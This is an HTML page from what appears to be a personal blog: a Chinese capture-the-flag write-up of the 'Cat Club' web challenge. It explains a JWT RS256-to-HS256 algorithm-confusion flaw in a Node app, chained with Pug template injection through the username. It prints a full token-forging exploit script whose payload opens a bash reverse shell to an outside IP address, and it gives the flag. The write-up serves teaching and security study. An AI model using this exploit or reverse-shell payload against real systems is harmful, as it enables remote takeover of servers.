@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="跟wgpsec打，贴wgpsec wp：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;xNaax4gs57QJewENxlTT5g 这次web3出的特别好，写篇wp记录一下 下载附件，审计。整个web app大致实现了一个注册登录和访问静态页面的功能。注意到用的jwt做登陆凭证。且使用的RS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="1337 live CTF web Cat Club 单题wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="跟wgpsec打，贴wgpsec wp：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;xNaax4gs57QJewENxlTT5g 这次web3出的特别好，写篇wp记录一下 下载附件，审计。整个web app大致实现了一个注册登录和访问静态页面的功能。注意到用的jwt做登陆凭证。且使用的RS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18553824/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18553824/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18553824/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18553824/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18553824/05.png">
+<meta property="article:published_time" content="2024-11-19T13:54:00.000Z">
+<meta property="article:modified_time" content="2024-11-19T13:54:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Crypto">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18553824/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>1337 live CTF web Cat Club 单题wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-12-15-cn-fnstctf-web/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-11-13-hkcert-2024-web-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&text=1337 live CTF web Cat Club 单题wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&title=1337 live CTF web Cat Club 单题wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&is_video=false&description=1337 live CTF web Cat Club 单题wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=1337 live CTF web Cat Club 单题wp&body=Check out this article: https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&title=1337 live CTF web Cat Club 单题wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&title=1337 live CTF web Cat Club 单题wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&title=1337 live CTF web Cat Club 单题wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&title=1337 live CTF web Cat Club 单题wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&name=1337 live CTF web Cat Club 单题wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&t=1337 live CTF web Cat Club 单题wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        1337 live CTF web Cat Club 单题wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-19T13:54:00.000Z" class="dt-published" itemprop="datePublished">2024-11-19</time>
+        
+        (Updated: <time datetime="2024-11-19T13:54:00.000Z" class="dt-updated" itemprop="dateModified">2024-11-19</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Crypto/" rel="tag">Crypto</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>跟wgpsec打，贴wgpsec wp：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xNaax4gs57QJewENxlTT5g">https://mp.weixin.qq.com/s/xNaax4gs57QJewENxlTT5g</a></p>
+<p>这次web3出的特别好，写篇wp记录一下</p>
+<p>下载附件，审计。整个web app大致实现了一个注册登录和访问静态页面的功能。注意到用的jwt做登陆凭证。且使用的RS256算法。<strong>而且有好好的JWT库不用非得自己写jwt验证算法，可疑</strong>。</p>
+<p>jwt验证部分（jwt_helpers.js）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">const jwt = require(&quot;json-web-token&quot;);</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const path = require(&quot;path&quot;);</span><br><span class="line"></span><br><span class="line">const privateKey = fs.readFileSync(path.join(__dirname, &quot;..&quot;, &quot;private_key.pem&quot;), &quot;utf8&quot;);</span><br><span class="line">const publicKey = fs.readFileSync(path.join(__dirname, &quot;..&quot;, &quot;public_key.pem&quot;), &quot;utf8&quot;);</span><br><span class="line"></span><br><span class="line">function signJWT(payload) &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">        jwt.encode(privateKey, payload, &quot;RS256&quot;, (err, token) =&gt; &#123;</span><br><span class="line">            if (err) &#123;</span><br><span class="line">                return reject(new Error(&quot;Error encoding token&quot;));</span><br><span class="line">            &#125;</span><br><span class="line">            resolve(token);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function verifyJWT(token) &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">        if (!token || typeof token !== &quot;string&quot; || token.split(&quot;.&quot;).length !== 3) &#123;</span><br><span class="line">            return reject(new Error(&quot;Invalid token format&quot;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        jwt.decode(publicKey, token, (err, payload, header) =&gt; &#123;</span><br><span class="line">            if (err) &#123;</span><br><span class="line">                return reject(new Error(&quot;Invalid or expired token&quot;));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (header.alg.toLowerCase() === &quot;none&quot;) &#123;</span><br><span class="line">                return reject(new Error(&quot;Algorithm &#x27;none&#x27; is not allowed&quot;));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            resolve(payload);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = &#123; signJWT, verifyJWT &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>还是太菜了，第一眼看到禁止了none，第二眼看到限制了类型为string和<code>.</code>的个数（无法构造畸形jwt）就不会别的了，没审出问题来</p>
+<p>反正看到RS256先盲猜一手应该是公钥碰撞+分解n破解私钥。管他呢！先碰撞公钥再说。随便注册两个账户，用 <a target="_blank" rel="noopener" href="https://github.com/silentsignal/rsa_sign2n">https://github.com/silentsignal/rsa_sign2n</a> 电脑穿越火线了半个小时出公钥</p>
+<p><img src="/images/migrated/18553824/01.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw4oPEx+448XQWH/OtSWN</span><br><span class="line">8L0NUDU+rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpat</span><br><span class="line">hL1zf3/Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQz</span><br><span class="line">YcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnR</span><br><span class="line">fT5HJjSRu/JmGlYCrFSof5p/E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t</span><br><span class="line">8opUrLbrJYoWFeYZOY/Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ+H</span><br><span class="line">dwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>（后来发现网站有个jwks.json可以直接获取jwk出公钥，小丑了属于是）</p>
+<p>后来直接上ctfrsatools爆破，无果。卡死了。只能放弃这条路。我们可以看到最后是要读取同目录下的flag.txt文件，伪造jwt也不能读取文件啊（除了kid读取漏洞）于是觉得可能是想多了，就没再关注。</p>
+<p>这里的sink其实很简单。显然看到pub就应该应激想到SSRF的。然而没有找到complie函数（所以一开始没看，显然能触发pub SSTI的函数不止compile还有render，我也是有够人机的）。但后来跳出jwt的思维之后很快就发现了sink</p>
+<p><img src="/images/migrated/18553824/02.png"></p>
+<p>这里把guest替换成了登录用户的名称（如果已经登陆了的话）然后直接render。显然，在用户名处注入代码，在主页渲染的时候可以打pub模板注入攻击。</p>
+<p>跟进替换guest的req.user，看到它是从getCurrentUser函数中获取</p>
+<p><img src="/images/migrated/18553824/03.png"></p>
+<p>从jwt里获取用户名直接渲染！于是我兴致勃勃地去看注册功能，看看能不能合法地注册到含特殊字符的用户名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const &#123; BadRequest &#125; = require(&quot;http-errors&quot;);</span><br><span class="line"></span><br><span class="line">function sanitizeUsername(username) &#123;</span><br><span class="line">    const usernameRegex = /^[a-zA-Z0-9]+$/;</span><br><span class="line"></span><br><span class="line">    if (!usernameRegex.test(username)) &#123;</span><br><span class="line">        throw new BadRequest(&quot;Username can only contain letters and numbers.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    sanitizeUsername,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>用户名只能包含数字和英文字母。。。看了一下也没有SQL注入的可能。</p>
+<p>于是与最开始的思路串联起来。我们也许可以通过伪造jwt的方式将SSTI注入代码写到用户名里（在渲染的时候没有做用户是否存在的检查）。这显然是行得通的一种思路。但这就需要我们获取到可以伪造jwt的密钥，也就是RS256算法里的私钥。根据我ctfrsatool跑了一晚上也没跑出来的结果看是不可能直接分解公钥n来解私钥的（网鼎青龙组web1就可以www）。</p>
+<p>于是又回来看jwt验证代码。</p>
+<p><img src="/images/migrated/18553824/04.png"></p>
+<p>细心一点看，可以发现虽然说这个代码验证了加密算法不能为none。但是却没有指定算法一定是RS256就进resolve了！！！</p>
+<p>于是我拿着依赖<code>&quot;json-web-token&quot;: &quot;~3.0.0&quot;</code>上网查，果然有一个算法降级的洞。</p>
+<p>我们可以使用公钥在HS256下伪造，再将算法头改成HS256。这样就相当于把公开的公钥当成了HS256里的密钥进行签名。在jwt验证里是合法的！！！也就是说，服务器没有验证jwt的算法头就让第三方库去验证了，而这个第三方库也没有去验证算法头，导致攻击者可以随意更改算法。</p>
+<p>于是把公钥扔到HS256算法里当密钥来伪造jwt，并把算法头改成HS256，写一个弹shell的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const jwt = require(&quot;json-web-token&quot;);</span><br><span class="line"></span><br><span class="line">const jwk = &#123; &quot;kty&quot;: &quot;RSA&quot;, &quot;n&quot;: &quot;w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw&quot;, &quot;e&quot;: &quot;AQAB&quot;, &quot;alg&quot;: &quot;RS256&quot;, &quot;use&quot;: &quot;sig&quot; &#125;;</span><br><span class="line">const base64urlDecode = (str) =&gt;</span><br><span class="line">    Buffer.from(str.replace(/-/g, &#x27;+&#x27;).replace(/_/g, &#x27;/&#x27;), &#x27;base64&#x27;);</span><br><span class="line"></span><br><span class="line">const publicKey = crypto.createPublicKey(&#123;</span><br><span class="line">    key: &#123;</span><br><span class="line">        kty: jwk.kty,</span><br><span class="line">        n: base64urlDecode(jwk.n).toString(&#x27;base64&#x27;), </span><br><span class="line">        e: base64urlDecode(jwk.e).toString(&#x27;base64&#x27;)  </span><br><span class="line">    &#125;,</span><br><span class="line">    format: &#x27;jwk&#x27;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(publicKey.export(&#123; format: &#x27;pem&#x27;, type: &#x27;spki&#x27; &#125;));</span><br><span class="line">const abc = publicKey.export(&#123; format: &#x27;pem&#x27;, type: &#x27;spki&#x27; &#125;);</span><br><span class="line"></span><br><span class="line">let result = jwt.encode(abc, &#123;</span><br><span class="line">    &quot;username&quot;: &quot;#&#123;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/120.26.139.208/9001 0&gt;&amp;1\&quot;&#x27;)&#125;&quot;&#125;, &quot;HS256&quot;)</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18553824/05.png"></p>
+<p>弹shell 拿flag</p>
+<p><strong>INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vlun5_l1k3_7h47}</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&text=1337 live CTF web Cat Club 单题wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&title=1337 live CTF web Cat Club 单题wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&is_video=false&description=1337 live CTF web Cat Club 单题wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=1337 live CTF web Cat Club 单题wp&body=Check out this article: https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&title=1337 live CTF web Cat Club 单题wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&title=1337 live CTF web Cat Club 单题wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&title=1337 live CTF web Cat Club 单题wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&title=1337 live CTF web Cat Club 单题wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&name=1337 live CTF web Cat Club 单题wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-11-19-1337-live-ctf-web-cat-club-wp/&t=1337 live CTF web Cat Club 单题wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
